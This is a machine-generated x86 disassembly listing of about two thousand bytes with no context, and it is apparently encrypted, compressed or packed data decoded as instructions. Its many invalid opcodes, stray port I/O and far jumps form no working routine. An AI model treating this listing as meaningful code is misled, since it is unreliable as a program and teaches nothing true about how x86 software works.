  41473c:	lock rol DWORD PTR [eax+esi*2-0x3b],1
  414741:	or     al,BYTE PTR [ecx+ecx*8+0x5d]
  414745:	iret   
  414746:	loope  0x414790
  414748:	ror    eax,1
  41474a:	aas    
  41474b:	js     0x41470d
  41474d:	pop    edx
  41474e:	jnp    0x414799
  414750:	mov    al,ds:0xb2dbd1bd
  414755:	xchg   ebx,eax
  414756:	(bad)  
  414757:	pop    ecx
  414758:	push   ds
  414759:	inc    edi
  41475a:	xor    BYTE PTR [ebx+0x15],bl
  41475d:	dec    esp
  41475e:	or     al,0x1c
  414760:	enter  0x6ef3,0xd1
  414764:	jle    0x4147ac
  414766:	and    BYTE PTR [edx],ah
  414768:	test   eax,0x5f719d7e
  41476d:	cwde   
  41476e:	mov    WORD PTR [esp+eax*1-0x7d2a38c6],fs
  414775:	repz mov bh,0x70
  414778:	gs jae 0x414787
  41477b:	inc    ebx
  41477c:	jbe    0x414749
  41477e:	je     0x4147bb
  414780:	and    edx,esp
  414782:	and    esp,DWORD PTR [eax]
  414784:	test   DWORD PTR [ebp-0x2d2568ba],0x49ef1cf2
  41478e:	emms   
  414790:	out    dx,al
  414791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414792:	mov    ebx,DWORD PTR [edi-0x41]
  414795:	sub    al,BYTE PTR [ebp-0x7]
  414798:	mov    ch,0x39
  41479a:	lahf   
  41479b:	sub    DWORD PTR [ebx+0x4c],esp
  41479e:	or     DWORD PTR [edi],0xfffffff5
  4147a1:	dec    ebx
  4147a2:	cdq    
  4147a3:	jmp    0x414787
  4147a5:	push   ebp
  4147a6:	or     edx,edx
  4147a8:	xchg   ebp,eax
  4147a9:	retf   0x762
  4147ac:	rcl    esp,1
  4147ae:	add    eax,ebx
  4147b0:	mov    bh,BYTE PTR [ecx]
  4147b2:	jmp    0x58f5:0x89f23798
  4147b9:	and    BYTE PTR [ebx+0x43],dh
  4147bc:	add    al,0x9d
  4147be:	pop    ebx
  4147bf:	jmp    0x41478e
  4147c1:	and    eax,0xa70f28a8
  4147c6:	xor    BYTE PTR [edx],bh
  4147c8:	push   ds
  4147c9:	add    bh,BYTE PTR [ecx+0x30d76973]
  4147cf:	push   eax
  4147d0:	pop    eax
  4147d1:	and    eax,0xafe2e518
  4147d6:	and    BYTE PTR [ebp-0x3],ch
  4147d9:	pop    es
  4147da:	cmp    ecx,DWORD PTR [eax+0x3b]
  4147dd:	cdq    
  4147de:	mov    ebx,0xd2f2d1e8
  4147e3:	sbb    eax,0x94b8f3a1
  4147e8:	cdq    
  4147e9:	sub    ah,ch
  4147eb:	mov    ds:0x94b82517,eax
  4147f0:	mov    edi,0x5d692429
  4147f5:	sti    
  4147f6:	jno    0x414868
  4147f8:	jb     0x41485f
  4147fa:	or     bh,BYTE PTR [eax+0x15]
  4147fd:	dec    esi
  4147fe:	push   esi
  4147ff:	int3   
  414800:	jno    0x414820
  414802:	ja     0x414784
  414804:	dec    edx
  414805:	dec    esp
  414806:	lds    edx,FWORD PTR [edi]
  414808:	pop    DWORD PTR [edi-0x43]
  41480b:	out    0xa,al
  41480d:	pop    esp
  41480e:	push   ds
  41480f:	jbe    0x41480c
  414811:	jl     0x414854
  414813:	xchg   ebx,eax
  414814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414815:	stos   DWORD PTR es:[edi],eax
  414816:	jge    0x4147a6
  414818:	sbb    al,0x60
  41481a:	sub    BYTE PTR [esi+0x44c4249d],0xc7
  414821:	test   al,0xe5
  414823:	dec    ecx
  414824:	jge    0x4147b4
  414826:	std    
  414827:	sbb    eax,0x212dfd16
  41482c:	sahf   
  41482d:	retf   
  41482e:	inc    edi
  41482f:	xor    DWORD PTR [esp+esi*2+0x870c44b],edx
  414836:	ss push 0x4fd945a3
  41483c:	xchg   ebx,eax
  41483d:	popf   
  41483e:	dec    eax
  41483f:	push   0x44d72da1
  414844:	xchg   esp,eax
  414845:	and    dl,bl
  414847:	rcl    BYTE PTR [ebx],1
  414849:	mov    esi,DWORD PTR [esi]
  41484b:	fisub  WORD PTR [ebp-0x7a]
  41484e:	cmp    al,0x39
  414850:	cli    
  414851:	sub    esp,ebx
  414853:	in     eax,0x1c
  414855:	out    0x25,eax
  414857:	les    esi,FWORD PTR [esi+0x488df64]
  41485d:	in     eax,dx
  41485e:	sbb    edx,DWORD PTR [ecx+0x7afd6e9b]
  414864:	loop   0x41484b
  414866:	mov    fs,WORD PTR [edi]
  414868:	retf   0x6b07
  41486b:	and    eax,0x2dcd7eb1
  414870:	ja     0x4148a6
  414872:	aas    
  414873:	jp     0x4148db
  414875:	jno    0x4147f8
  414877:	fs dec ebx
  414879:	(bad)  
  41487a:	(bad)
  41487d:	les    edx,FWORD PTR [ecx-0x3a]
  414880:	jbe    0x4148c2
  414882:	loopne 0x41489c
  414884:	(bad)  
  414885:	(bad)  
  414886:	dec    edi
  414887:	dec    edx
  414888:	jg     0x4148cb
  41488a:	mov    esp,0xc21dce35
  41488f:	mov    ah,0x89
  414891:	(bad)  
  414892:	xchg   esp,eax
  414893:	aaa    
  414894:	les    edi,FWORD PTR [eax+ebx*8-0x55]
  414898:	sub    eax,0x8b5b5c7e
  41489d:	mov    ecx,0xb17a8222
  4148a2:	pop    ebp
  4148a3:	dec    eax
  4148a4:	or     dl,0x6e
  4148a7:	out    dx,al
  4148a8:	xchg   edx,eax
  4148a9:	js     0x4148a6
  4148ab:	inc    esi
  4148ac:	add    eax,0x45787eea
  4148b1:	lods   al,BYTE PTR ds:[esi]
  4148b2:	xor    BYTE PTR [esi+0x6ffb9b7a],cl
  4148b8:	inc    ecx
  4148b9:	add    DWORD PTR [edi-0x7f],ecx
  4148bc:	repnz dec esi
  4148be:	mov    eax,ds:0x2a914ea4
  4148c3:	xchg   edx,eax
  4148c4:	adc    ah,al
  4148c6:	inc    ecx
  4148c7:	mov    dl,0xc6
  4148c9:	fs adc eax,0x3ff6578a
  4148cf:	mov    ecx,0xa021b3b9
  4148d4:	lods   eax,DWORD PTR ds:[esi]
  4148d5:	push   cs
  4148d6:	clc    
  4148d7:	sahf   
  4148d8:	push   es
  4148d9:	xabort 0xb6
  4148dc:	mov    eax,ds:0x7ba6dcf0
  4148e1:	mov    es,WORD PTR [ebp+edx*1-0x29731ecb]
  4148e8:	jno    0x4148f6
  4148ea:	sbb    dl,BYTE PTR [edi+0x42]
  4148ed:	fisub  DWORD PTR [eax+0xbc2b24e]
  4148f3:	arpl   WORD PTR [ecx+0x2c],si
  4148f6:	push   edx
  4148f7:	nop
  4148f8:	cmp    esi,DWORD PTR [ebp-0x8fd952]
  4148fe:	fcomp  QWORD PTR [esp+edi*4-0x3d]
  414902:	lock and BYTE PTR [edx-0x7bb0399c],bl
  414909:	push   ss
  41490a:	cmp    cl,BYTE PTR [esp+ebx*1-0x61]
  41490e:	popf   
  41490f:	test   DWORD PTR [ebp-0x24],ebp
  414912:	xchg   BYTE PTR [eax-0x61],dh
  414915:	inc    edi
  414916:	cdq    
  414917:	gs aas 
  414919:	sbb    DWORD PTR [edi],edi
  41491b:	leave  
  41491c:	sbb    al,0xce
  41491e:	pop    es
  41491f:	aaa    
  414920:	pop    edx
  414921:	mov    edx,0x6aa565a3
  414926:	iret   
  414927:	sbb    dl,al
  414929:	cmp    DWORD PTR ds:0xefde4883,esp
  41492f:	cli    
  414930:	(bad)
  414933:	add    ebx,DWORD PTR ds:0x673f5094
  414939:	cmp    cl,0x47
  41493c:	call   0xe6dbceb6
  414941:	cli    
  414942:	add    DWORD PTR [esi-0x5b34d045],eax
  414948:	cwde   
  414949:	xchg   BYTE PTR [edi-0x67cb1970],ch
  41494f:	dec    eax
  414950:	and    esp,eax
  414952:	xchg   esp,eax
  414953:	jbe    0x41498d
  414955:	mov    bh,0x88
  414957:	ss dec eax
  414959:	fild   DWORD PTR fs:[ecx+0x48]
  41495d:	sbb    al,bh
  41495f:	pop    edi
  414960:	xlat   BYTE PTR ds:[ebx]
  414961:	pop    ebp
  414962:	ds jae 0x41496a
  414965:	je     0x414940
  414967:	pushf  
  414968:	fwait
  414969:	and    ah,0xad
  41496c:	inc    ebx
  41496d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41496e:	aas    
  41496f:	mov    ds:0x2e2322b3,eax
  414974:	pop    ecx
  414975:	or     ebx,DWORD PTR [ebp+0x5b]
  414978:	xor    DWORD PTR [ebx+0x41],ecx
  41497b:	retf   
  41497c:	ret    0x56f1
  41497f:	push   ds
  414980:	fdiv   DWORD PTR [edx+0x2d725f78]
  414986:	mov    al,ds:0xa076f8f6
  41498b:	mov    ah,0xae
  41498d:	xchg   ebx,eax
  41498e:	nop
  41498f:	jecxz  0x414981
  414991:	mov    dh,0x24
  414993:	cmp    ecx,DWORD PTR [eax]
  414995:	test   eax,edx
  414997:	sar    bh,0x93
  41499a:	ds and eax,0x28
  41499e:	dec    esi
  41499f:	xchg   edi,eax
  4149a0:	xchg   edi,eax
  4149a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149a2:	out    0x77,eax
  4149a4:	sbb    eax,0xb29d6e0
  4149a9:	call   0x20cb:0x917f8d0f
  4149b0:	mov    bl,0x4
  4149b2:	mov    ecx,0x1dd2bbf6
  4149b7:	inc    edi
  4149b8:	push   ss
  4149b9:	rol    BYTE PTR [edi-0x40c08cb5],1
  4149bf:	sbb    esp,0x41
  4149c2:	xor    eax,0x7a2704d0
  4149c7:	sub    al,0x80
  4149c9:	jne    0x41494e
  4149cb:	cdq    
  4149cc:	push   ecx
  4149cd:	fwait
  4149ce:	mov    fs,edi
  4149d0:	mov    esi,eax
  4149d2:	retf   0xe234
  4149d5:	jno    0x414994
  4149d7:	arpl   WORD PTR [eax],bx
  4149d9:	je     0x414990
  4149db:	ret    0x8d2c
  4149de:	dec    edi
  4149df:	ret    
  4149e0:	outs   dx,BYTE PTR ds:[esi]
  4149e1:	ss sbb eax,0x69a31875
  4149e7:	nop
  4149e8:	xor    BYTE PTR [ebp+0x51a206e0],bh
  4149ee:	fmul   DWORD PTR [eax]
  4149f0:	pop    ecx
  4149f1:	(bad)  
  4149f3:	in     eax,dx
  4149f4:	(bad)  
  4149f5:	lahf   
  4149f6:	retf   
  4149f7:	push   ebp
  4149f8:	mov    eax,ds:0xdb83b761
  4149fd:	pop    ebx
  4149fe:	sbb    al,BYTE PTR ds:0x8877938a
  414a04:	mov    BYTE PTR [eax+0x7be22adc],cl
  414a0a:	push   0xd6cd6d31
  414a0f:	inc    eax
  414a10:	xchg   ebx,eax
  414a11:	arpl   si,si
  414a13:	sbb    edx,0xc450dde5
  414a19:	add    eax,0xec6ded00
  414a1e:	jbe    0x4149d2
  414a20:	sub    eax,DWORD PTR [edi+0x67a4ba04]
  414a26:	dec    ebp
  414a27:	loopne 0x414a38
  414a29:	dec    esi
  414a2a:	sar    DWORD PTR [edi-0x4a],cl
  414a2d:	js     0x414a70
  414a2f:	shr    DWORD PTR [ebx+0x6],0x2b
  414a33:	push   edi
  414a34:	and    cl,BYTE PTR [eax]
  414a36:	ret    
  414a37:	test   al,0x4d
  414a39:	jo     0x4149f3
  414a3b:	out    0x5,al
  414a3d:	sbb    al,BYTE PTR [eax-0x30]
  414a40:	dec    esi
  414a41:	pop    ds
  414a42:	dec    eax
  414a43:	dec    eax
  414a44:	add    dh,BYTE PTR [ecx]
  414a46:	ss xchg ebx,eax
  414a48:	add    ebp,DWORD PTR [edx+eax*4+0x51845354]
  414a4f:	and    dh,BYTE PTR [ebx-0x75533f71]
  414a55:	fdiv   st(5),st
  414a57:	mov    dh,0x94
  414a59:	ss sub dl,dh
  414a5c:	dec    ebp
  414a5d:	cld    
  414a5e:	sbb    al,0x41
  414a60:	js     0x4149f3
  414a62:	mov    bl,0x2d
  414a64:	addr16 mov dh,0xd3
  414a67:	xchg   ebx,eax
  414a68:	enter  0x994c,0x39
  414a6c:	mov    ah,0xf2
  414a6e:	jnp    0x414a23
  414a70:	xor    eax,0xd288d9b8
  414a75:	fldcw  WORD PTR [ebx+0x28942f1f]
  414a7b:	stos   BYTE PTR es:[edi],al
  414a7c:	gs adc al,0x9
  414a7f:	hlt    
  414a80:	and    DWORD PTR [edi],ebx
  414a82:	aam    0xdb
  414a84:	jge    0x414aa9
  414a86:	lds    esp,FWORD PTR [ebx]
  414a88:	jmp    0xbd69:0xca56a1b7
  414a8f:	push   edx
  414a90:	fs pop ebp
  414a92:	fnstcw WORD PTR [edi+eiz*4]
  414a95:	lods   al,BYTE PTR ds:[esi]
  414a96:	out    0xfd,eax
  414a98:	jg     0x414ab1
  414a9a:	or     cl,ch
  414a9c:	les    edi,FWORD PTR [edx-0x14]
  414a9f:	dec    edx
  414aa0:	push   edi
  414aa1:	inc    esp
  414aa2:	out    0xc1,al
  414aa4:	shr    DWORD PTR [edi],cl
  414aa6:	sti    
  414aa7:	nop
  414aa8:	pop    eax
  414aa9:	std    
  414aaa:	fidivr WORD PTR [eax+0x16d03ced]
  414ab0:	jg     0x414ac0
  414ab2:	je     0x414afa
  414ab4:	loopne 0x414ac9
  414ab6:	xchg   ebp,eax
  414ab7:	and    eax,0x3858c436
  414abc:	lea    edx,[esi+0x368ad961]
  414ac2:	bound  ebp,QWORD PTR ds:0xce08b93
  414ac8:	xchg   esp,eax
  414ac9:	(bad)  
  414aca:	mov    ds:0x1833ff01,al
  414acf:	out    0xf0,al
  414ad1:	pop    ebx
  414ad2:	das    
  414ad3:	call   0x61ed:0x967baba0
  414ada:	xchg   esi,eax
  414adb:	das    
  414adc:	jne    0x414ab4
  414ade:	dec    edx
  414adf:	(bad)  
  414ae0:	neg    BYTE PTR [edi+esi*1+0x525e79b7]
  414ae7:	out    0x52,eax
  414ae9:	out    dx,eax
  414aea:	cmp    bl,ah
  414aec:	jge    0x414b34
  414aee:	sbb    dh,BYTE PTR [esi+edx*4]
  414af1:	ror    bh,0xa0
  414af4:	mov    DWORD PTR [edx+0x48656138],ecx
  414afa:	aaa    
  414afb:	mov    ecx,0xf804521e
  414b00:	sub    BYTE PTR [esi-0x65542bc8],cl
  414b06:	imul   ebx,DWORD PTR [esi-0x17408d9b],0x68f1efef
  414b10:	jnp    0x414b3a
  414b12:	sbb    DWORD PTR [eax-0x35ada0c3],esi
  414b18:	inc    edx
  414b19:	pushf  
  414b1a:	imul   esi,DWORD PTR [edi],0x19
  414b1d:	jae    0x414aa6
  414b1f:	lods   eax,DWORD PTR ds:[esi]
  414b20:	jo     0x414b23
  414b22:	mov    al,ds:0x24062768
  414b27:	scas   al,BYTE PTR es:[edi]
  414b28:	or     DWORD PTR ds:0x3fb394f8,esp
  414b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b2f:	fst    st(0)
  414b31:	popf   
  414b32:	dec    edx
  414b33:	out    dx,eax
  414b34:	dec    esp
  414b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b36:	call   0x477fb034
  414b3b:	(bad)  
  414b3c:	adc    BYTE PTR es:[edi+eax*1],0x1f
  414b41:	push   edi
  414b42:	test   eax,ebp
  414b44:	je     0x414b03
  414b46:	push   edi
  414b47:	lea    eax,[eax+edi*4-0x11]
  414b4b:	loopne 0x414ae2
  414b4d:	cmp    al,BYTE PTR [esi+0x516f14b1]
  414b53:	sar    DWORD PTR [eax],1
  414b55:	fwait
  414b56:	push   ebp
  414b57:	jbe    0x414bba
  414b59:	adc    BYTE PTR [esi+edi*4+0x73690abd],cl
  414b60:	mov    dh,0xb5
  414b62:	in     eax,dx
  414b63:	nop
  414b64:	xlat   BYTE PTR ds:[ebx]
  414b65:	jo     0x414b60
  414b67:	adc    eax,0x85399d85
  414b6c:	mov    ch,0x31
  414b6e:	jmp    DWORD PTR [edi-0x26ba9f4e]
  414b74:	shl    esp,cl
  414b76:	xchg   BYTE PTR [ebp+0x45c1fcf3],cl
  414b7c:	ja     0x414bde
  414b7e:	xchg   bh,cl
  414b80:	inc    ebx
  414b81:	or     BYTE PTR [esi-0x64],bh
  414b84:	call   DWORD PTR [edx]
  414b86:	fcomp  DWORD PTR ds:0x65feffb
  414b8c:	hlt    
  414b8d:	and    eax,0x589df9ea
  414b92:	fwait
  414b93:	jge    0x414b54
  414b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b96:	cli    
  414b97:	add    DWORD PTR [ecx+0x37f73794],esi
  414b9d:	scas   al,BYTE PTR es:[edi]
  414b9e:	pop    ds
  414b9f:	push   es
  414ba0:	scas   eax,DWORD PTR es:[edi]
  414ba1:	pop    ds
  414ba2:	les    eax,FWORD PTR [eax+0x6aa226f0]
  414ba8:	xor    BYTE PTR [ebx+0x2b4ccf08],dl
  414bae:	inc    ecx
  414baf:	pop    ds
  414bb0:	sub    ebp,ecx
  414bb2:	dec    ecx
  414bb3:	imul   esi,DWORD PTR [edx-0x5b],0x46325745
  414bba:	jecxz  0x414b7b
  414bbc:	or     al,0x1f
  414bbe:	jp     0x414b86
  414bc0:	adc    BYTE PTR [ecx-0x33],ch
  414bc3:	fwait
  414bc4:	aad    0x56
  414bc6:	cmc    
  414bc7:	repnz adc eax,0x1a296c93
  414bcd:	dec    ecx
  414bce:	ret    
  414bcf:	popa   
  414bd0:	xor    al,0x67
  414bd2:	loope  0x414b5d
  414bd4:	fadd   st(6),st
  414bd6:	out    dx,eax
  414bd7:	dec    ebx
  414bd8:	int    0xd5
  414bda:	jmp    0xd4e5:0xd50fe690
  414be1:	(bad)  [ebx-0x74fcbeb4]
  414be7:	dec    esp
  414be8:	push   ebx
  414be9:	shl    DWORD PTR [edx+esi*4],0xa7
  414bed:	ret    0x3c4c
  414bf0:	loop   0x414c5b
  414bf2:	xlat   BYTE PTR ds:[ebx]
  414bf3:	xor    al,0xdb
  414bf5:	pop    ds
  414bf6:	aas    
  414bf7:	jne    0x414be4
  414bf9:	aam    0x79
  414bfb:	ins    BYTE PTR es:[di],dx
  414bfd:	xor    ah,BYTE PTR [ecx+0x16c12f5c]
  414c03:	ret    0x25bf
  414c06:	sbb    al,0x12
  414c08:	push   0x22
  414c0a:	(bad)  
  414c0c:	mov    ds:0x385e132b,al
  414c11:	sbb    ax,WORD PTR es:[edx-0x7aa1b226]
  414c19:	imul   ecx,DWORD PTR [ebx-0x69aa16ce],0x923110df
  414c23:	fiadd  DWORD PTR [esi-0x79]
  414c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c27:	dec    esp
  414c28:	(bad)  
  414c29:	call   0x81dd:0x80f504d0
  414c30:	inc    esi
  414c31:	out    dx,al
  414c32:	retf   0x3a9a
  414c35:	loop   0x414c5a
  414c37:	lahf   
  414c38:	aam    0x2c
  414c3a:	in     al,0xbd
  414c3c:	jns    0x414c1f
  414c3e:	mov    bh,0x54
  414c40:	sub    al,ah
  414c42:	push   ss
  414c43:	dec    edi
  414c44:	ret    
  414c45:	adc    BYTE PTR [edx-0x2dd331d2],bh
  414c4b:	cmp    ch,dl
  414c4d:	in     al,dx
  414c4e:	mov    cl,BYTE PTR [esi]
  414c50:	xchg   ebx,eax
  414c51:	push   esp
  414c52:	leave  
  414c53:	mov    BYTE PTR ds:[ebx+0x27],dh
  414c57:	dec    eax
  414c58:	in     eax,dx
  414c59:	adc    eax,0x3882a9ee
  414c5e:	xor    BYTE PTR [ebx-0x1c],al
  414c61:	aad    0x8e
  414c63:	push   ebx
  414c64:	dec    ecx
  414c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c66:	jne    0x414cd6
  414c68:	mov    al,ds:0xa4f14867
  414c6d:	sub    DWORD PTR ds:0x6e9389ae,0x78
  414c74:	cmp    DWORD PTR [ecx],esp
  414c76:	mov    al,ds:0xd13d75de
  414c7b:	(bad)  
  414c7c:	jl     0x414c4a
  414c7e:	gs hlt 
  414c80:	mov    ebx,edx
  414c82:	(bad)  
  414c83:	xor    ecx,edx
  414c85:	out    0x8f,al
  414c87:	sub    eax,DWORD PTR [eax]
  414c89:	pop    edi
  414c8a:	clc    
  414c8b:	mov    esi,DWORD PTR [ecx+ebx*2]
  414c8e:	dec    ebp
  414c8f:	or     DWORD PTR [edx-0x36],ecx
  414c92:	shl    bh,0xbd
  414c95:	inc    esp
  414c96:	adc    eax,0xe8618bbe
  414c9b:	scas   eax,DWORD PTR es:[edi]
  414c9c:	jecxz  0x414ced
  414c9e:	jmp    0x414c63
  414ca0:	popa   
  414ca1:	sti    
  414ca2:	lea    edx,[ecx]
  414ca4:	loop   0x414cf4
  414ca6:	outs   dx,BYTE PTR ds:[esi]
  414ca7:	fst    QWORD PTR [edx]
  414ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414caa:	lea    ebx,[edi-0x26]
  414cad:	stos   BYTE PTR es:[edi],al
  414cae:	pusha  
  414caf:	cmp    DWORD PTR [ebx],esp
  414cb1:	gs jmp 0x54b31cd9
  414cb7:	fs mov bl,0xc5
  414cba:	jb     0x414ce4
  414cbc:	and    ecx,DWORD PTR [ebp-0x68344781]
  414cc2:	dec    esp
  414cc3:	or     BYTE PTR [eax+0x167ae41f],ch
  414cc9:	or     bl,BYTE PTR [ecx-0x1306cbae]
  414ccf:	and    eax,0xfe880c9b
  414cd4:	lods   eax,DWORD PTR ds:[esi]
  414cd5:	outs   dx,BYTE PTR ds:[esi]
  414cd6:	ss jle 0x414d3d
  414cd9:	and    eax,0xdd3d3b5d
  414cde:	xor    cl,ch
  414ce0:	rcl    DWORD PTR [edx-0x54580d8a],0xfc
  414ce7:	dec    eax
  414ce8:	cmp    BYTE PTR [edx],0x4e
  414ceb:	rcr    DWORD PTR es:[edi-0x41d1cc3f],0xef
  414cf3:	or     eax,ebx
  414cf5:	in     eax,0xf0
  414cf7:	nop
  414cf8:	mov    ah,0xa6
  414cfa:	sub    BYTE PTR [edx-0xb],bl
  414cfd:	mov    edx,DWORD PTR [eax+0x69]
  414d00:	mov    bh,0x44
  414d02:	sub    cl,0x8a
  414d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d06:	jnp    0x414cda
  414d08:	outs   dx,DWORD PTR ds:[esi]
  414d09:	cmp    dl,BYTE PTR [esi]
  414d0b:	stos   DWORD PTR es:[edi],eax
  414d0c:	xor    bh,BYTE PTR [esi+0x390a7e1]
  414d12:	mov    eax,ds:0xd5aff0bb
  414d17:	popa   
  414d18:	push   ds
  414d19:	dec    eax
  414d1a:	fcmovb st,st(4)
  414d1c:	push   ss
  414d1d:	gs mov ch,0x8c
  414d20:	jbe    0x414d4f
  414d22:	popa   
  414d23:	popf   
  414d24:	hlt    
  414d25:	mov    edi,0xbe6b1091
  414d2a:	imul   eax,DWORD PTR [esi+0x5963ce20],0x4f293984
  414d34:	jmp    0x9fc7:0x72b82bb0
  414d3b:	mov    edi,0xcd4f287a
  414d40:	std    
  414d41:	clc    
  414d42:	and    BYTE PTR [esi+ecx*4],ah
  414d45:	dec    ebp
  414d46:	cli    
  414d47:	shl    BYTE PTR ds:0x693cf6e8,cl
  414d4d:	jl     0x414d9a
  414d4f:	xor    al,0xd0
  414d51:	cmp    al,0xe2
  414d53:	sbb    edx,edi
  414d55:	jge    0x414d5f
  414d57:	out    dx,eax
  414d58:	aaa    
  414d59:	jmp    0x35cb:0x49f4fda5
  414d60:	fsub   QWORD PTR [ecx-0x58edeb2c]
  414d66:	jp     0x414d1b
  414d68:	and    eax,0x850f9440
  414d6d:	pop    eax
  414d6e:	jno    0x414d00
  414d70:	cmp    BYTE PTR [ebx-0x7fc38c12],ah
  414d76:	inc    edx
  414d77:	iret   
  414d78:	out    dx,al
  414d79:	sub    BYTE PTR [ebp-0xd9422be],ch
  414d7f:	mov    eax,edx
  414d81:	lods   al,BYTE PTR ds:[esi]
  414d82:	adc    al,0xc4
  414d84:	mov    ecx,0xb9b8a0b7
  414d89:	cwde   
  414d8a:	add    dh,BYTE PTR [edi]
  414d8c:	dec    esp
  414d8d:	sub    eax,0x16fd1125
  414d92:	dec    edi
  414d93:	jne    0x414d5f
  414d95:	imul   esi,DWORD PTR [edi+0x4073bf62],0x5d
  414d9c:	or     ecx,edx
  414d9e:	or     eax,DWORD PTR [esi-0x6615f89c]
  414da4:	int3   
  414da5:	gs rol ebx,cl
  414da8:	mov    DWORD PTR [ebp-0x264e7a4e],esi
  414dae:	scas   al,BYTE PTR es:[edi]
  414daf:	loop   0x414de1
  414db1:	dec    ebx
  414db2:	(bad)  
  414db3:	sub    eax,0x801b7a1e
  414db8:	pop    edx
  414db9:	sbb    al,cl
  414dbb:	pop    ecx
  414dbc:	pop    esi
  414dbd:	dec    ecx
  414dbe:	or     dh,dl
  414dc0:	sahf   
  414dc1:	push   ebx
  414dc2:	into   
  414dc3:	lahf   
  414dc4:	and    eax,DWORD PTR [ebp-0x17]
  414dc7:	lock mov dh,0x39
  414dca:	clc    
  414dcb:	pop    es
  414dcc:	gs ret 0xa6d2
  414dd0:	add    eax,esp
  414dd2:	mov    ds:0xaa8362b0,eax
  414dd7:	sti    
  414dd8:	sub    ch,BYTE PTR [ebp-0x7e]
  414ddb:	jecxz  0x414e55
  414ddd:	sub    eax,0xa0bce3d2
  414de2:	frstor [edi+0x22077760]
  414de8:	js     0x414df5
  414dea:	jb     0x414e5a
  414dec:	fidivr WORD PTR [eax-0x34]
  414def:	loopne 0x414dbe
  414df1:	cmc    
  414df2:	into   
  414df3:	retf   
  414df4:	ror    esp,cl
  414df6:	inc    edx
  414df7:	jns    0x414da8
  414df9:	mov    BYTE PTR [edx+0x56],bl
  414dfc:	and    eax,0xbc597128
  414e01:	cwde   
  414e02:	jmp    0xcf50:0xea186076
  414e09:	push   es
  414e0a:	mov    ebx,0x73902e85
  414e0f:	push   edi
  414e10:	sahf   
  414e11:	mov    DWORD PTR [ebp-0x56],ebp
  414e14:	inc    esp
  414e15:	dec    ebx
  414e16:	xor    BYTE PTR [ebp+0x2d154d01],bl
  414e1c:	test   cl,ch
  414e1e:	aas    
  414e1f:	cmp    eax,0xe049f44
  414e24:	jo     0x414e62
  414e26:	outs   dx,DWORD PTR ds:[esi]
  414e27:	xor    eax,0x4ee92f98
  414e2c:	(bad)  
  414e2d:	adc    DWORD PTR [ebp+0x3b],edi
  414e30:	ret    
  414e31:	aas    
  414e32:	mov    ebp,0x4bfaa72f
  414e37:	sub    eax,0x3c9c954e
  414e3c:	fistp  WORD PTR [ebp+ebx*2+0x47733ba4]
  414e43:	aas    
  414e44:	jmp    0xd5a5:0x72e89c02
  414e4b:	or     dl,BYTE PTR [esi+0x12]
  414e4e:	sahf   
  414e4f:	inc    ebp
  414e50:	sub    eax,0xfde1215
  414e55:	dec    edi
  414e56:	push   eax
  414e57:	cmp    al,BYTE PTR [esi-0x152c6f5d]
  414e5d:	pop    ecx
  414e5e:	mov    eax,0xfc790447
  414e63:	mov    edi,0xd41b297
  414e68:	clc    
  414e69:	(bad)  
  414e6a:	inc    edi
  414e6b:	clc    
  414e6c:	xchg   esp,eax
  414e6d:	cmp    eax,0x71743fa7
  414e72:	mov    bh,0xf5
  414e74:	mov    ah,0xd5
  414e76:	and    eax,0xfeb40df
  414e7b:	push   ebp
  414e7c:	sti    
  414e7d:	add    ch,ch
  414e7f:	div    ch
  414e81:	sub    dl,al
  414e83:	clc    
  414e84:	ds mov dl,0xf1
  414e87:	push   ds
  414e88:	ret    0x7206
  414e8b:	fild   DWORD PTR [ecx-0x7dbc1711]
  414e91:	ret    0x900a
  414e94:	loop   0x414e76
  414e96:	inc    esp
  414e97:	dec    ecx
  414e98:	mov    ds:0x1280349a,al
  414e9d:	inc    edi
  414e9e:	add    eax,0xf9dd8ba3
  414ea3:	sub    BYTE PTR [edi-0x59f1f52],ah
  414ea9:	loop   0x414e2d
  414eab:	jmp    FWORD PTR [ebx-0x40]
  414eae:	mov    cl,0x1b
  414eb0:	(bad)  
  414eb1:	out    0x7e,eax
  414eb3:	push   ecx
  414eb4:	dec    edx
  414eb5:	in     al,dx
  414eb6:	pop    ds
  414eb7:	dec    edx
  414eb8:	adc    dh,bh
  414eba:	shl    BYTE PTR [edx],0x1a
  414ebd:	stos   DWORD PTR es:[edi],eax
  414ebe:	jge    0x414e77
  414ec0:	stc    
  414ec1:	outs   dx,DWORD PTR ds:[esi]
  414ec2:	jp     0x414ec5
  414ec4:	mul    BYTE PTR ds:[eax]
  414ec7:	jecxz  0x414f46
  414ec9:	mov    bh,0x34
  414ecb:	mov    al,ds:0x72702f1
  414ed0:	xor    edx,DWORD PTR [esi+0x4fdc277e]
  414ed6:	ss ja  0x414f00
  414ed9:	or     eax,0xfe519113
  414ede:	outs   dx,BYTE PTR ds:[esi]
  414edf:	jo     0x414ec0
  414ee1:	add    DWORD PTR [ebx+0x30a1aa38],esp
  414ee7:	inc    ebx
  414ee8:	inc    edx
  414ee9:	je     0x414eba
  414eeb:	sub    al,0x2d
  414eed:	or     eax,0x6a15abcc
  414ef2:	jl     0x414ef2
  414ef4:	call   0x4ad9082
  414ef9:	(bad)  
  414efa:	cmp    eax,0x817b3dda
  414eff:	mul    edi
  414f01:	xor    ah,dh
  414f03:	jp     0x414ecb
  414f05:	fwait
  414f06:	inc    esi
  414f07:	das    
  414f08:	ins    BYTE PTR es:[edi],dx
  414f09:	and    DWORD PTR [esi],esp
  414f0b:	aad    0xb2
  414f0d:	mov    ebp,0x70f062ca
  414f12:	push   ebp
  414f13:	xor    eax,0xf72edecf
  414f18:	in     al,0x4a
  414f1a:	jno    0x414f30
  414f1c:	add    BYTE PTR [edi+0x47],0xec
  414f20:	push   ss
  414f21:	fstp   TBYTE PTR fs:[eax+ecx*2-0x6d]
  414f26:	pop    ds
  414f27:	aad    0x23
  414f29:	dec    ecx
  414f2a:	push   eax
  414f2b:	loop   0x414f15
